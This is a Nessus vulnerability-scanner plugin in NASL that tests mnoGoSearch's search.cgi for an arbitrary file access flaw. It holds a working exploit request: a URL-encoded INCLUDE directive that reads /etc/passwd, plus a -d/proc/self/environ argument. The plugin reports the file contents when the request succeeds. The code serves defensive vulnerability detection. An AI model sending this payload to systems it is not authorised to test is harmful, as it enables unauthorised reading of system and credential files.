#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65902);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_bugtraq_id(58242);
  script_osvdb_id(90786);
  script_xref(name:"EDB-ID", value:"24630");

  script_name(english:"mnoGoSearch search.cgi QUERY_STRING Parameter Parsing Arbitrary File Access");
  script_summary(english:"Attempts to view /etc/passwd");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a CGI script that is affected by an
arbitrary file access vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of mnoGoSearch installed on the remote host is affected by
an arbitrary file access vulnerability due to a flaw in the 'search.cgi'
script when parsing user-supplied input from the QUERY_STRING parameter. 
An unauthenticated, remote attacker can leverage this issue by sending a
specially crafted request in order to view arbitrary files on the remote
host, subject to the privileges under which the web server runs. 

Note that the application is reportedly also affected by a cross-site
scripting vulnerability, however Nessus has not tested for this."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2013/Mar/17");
  script_set_attribute(attribute:"see_also", value:"http://www.mnogosearch.org/bugs/index.php?id=4818");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 3.3.13 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/03/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/04/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mnogosearch:mnogosearch");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("mnogosearch_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/mnogosearch");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "mnogosearch",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);

# Ensure to only test Unix installs using search.cgi (affected versions)
if (dir !~ "search\.cgi")
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "mnoGoSearch", install_url);

file = "/etc/passwd";
file_pats = "root:.*:0:[01]:";

url = "/%0A%3C!--top--%3E%0A%3C!INCLUDE%20CONTENT=%22file:" + file +
  "%22%3E%0A%3C!--/top--%3E?-d/proc/self/environ";

res = http_send_recv3(
  method   : "GET",
  item     : dir + url,
  port     : port,
  exit_on_fail : TRUE
);

if (res[2] =~ file_pats)
{
  if (report_verbosity > 0)
  {
    max = 15;
    snip =  '\n'+crap(data:"-", length:30)+" snip "+crap(data:"-", length:30);
    report =
      '\nNessus was able to exploit the issue to retrieve the contents of '+
      '\n'+ "'" + file + "'" + ' using the following request :' +
      '\n' +
      '\n' + install_url + url +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\nThis produced the following truncated output (limited to ' + max +' lines) :' +
        '\n' +
        '\n' + snip +
        '\n' + beginning_of_response(resp:res[2], max_lines:max) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "mnoGoSearch", install_url);
